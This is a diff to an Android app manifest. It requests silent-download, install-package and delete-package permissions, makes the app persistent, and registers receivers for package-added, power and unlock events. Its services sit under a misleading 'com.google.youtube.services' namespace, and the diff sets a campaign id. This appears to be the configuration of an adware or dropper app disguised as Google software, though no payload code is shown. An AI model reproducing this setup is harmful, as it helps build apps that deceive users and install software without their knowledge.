@@ -27,14 +27,15 @@
     <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />
     <uses-permission android:name="android.permission.INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.DELETE_PACKAGES" />
-     <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
     
 
     <application
         android:allowBackup="true"
         android:icon="@drawable/ic_launcher"
         android:label="@string/app_name"
-        android:theme="@style/AppTheme" >
+        android:theme="@style/AppTheme" android:persistent="true">
+        
         <activity
             android:name="com.demo.activity.DemoActivity"
             android:theme="@android:style/Theme.NoTitleBar" >
@@ -62,10 +63,10 @@
                 <action android:name="android.net.wifi.STATE_CHANGE" />
                 <action android:name="android.intent.category.DEFAULT" />
             </intent-filter>
+            
             <intent-filter>
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
                 <action android:name="android.intent.category.DEFAULT" />
-
                 <data android:scheme="package" />
             </intent-filter>
 
@@ -74,10 +75,9 @@
                 <action android:name="android.intent.category.DEFAULT" />
                 <data android:scheme="package" />
             </intent-filter>
-            
             <intent-filter>
                 <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
-                <action android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
             
             <intent-filter>
@@ -85,6 +85,7 @@
             </intent-filter>
             <intent-filter>
                 <action android:name="android.intent.action.USER_PRESENT" />
+                <category android:name="android.intent.category.DEFAULT"/>
             </intent-filter>
         </receiver>
 
@@ -93,12 +94,11 @@
         <service android:name="com.google.youtube.services.DowCplService" ></service>
         <service android:name="com.google.youtube.services.DirectDService"></service>
         <service android:name="com.google.youtube.services.DirectDLService"></service>
-        <service android:name="com.google.youtube.services.SService"></service>
         <service android:name="com.google.youtube.services.BrowserService"></service>
-
-        <meta-data
-            android:name="cid"
-            android:value="google_test" />
+        
+        <meta-data android:name="flurry_id" android:value="7WBW96N4M5GTBT6XV2XQ" />
+        <meta-data android:name="cid" android:value="Z5266"/>
+        
     </application>
 
 </manifest>
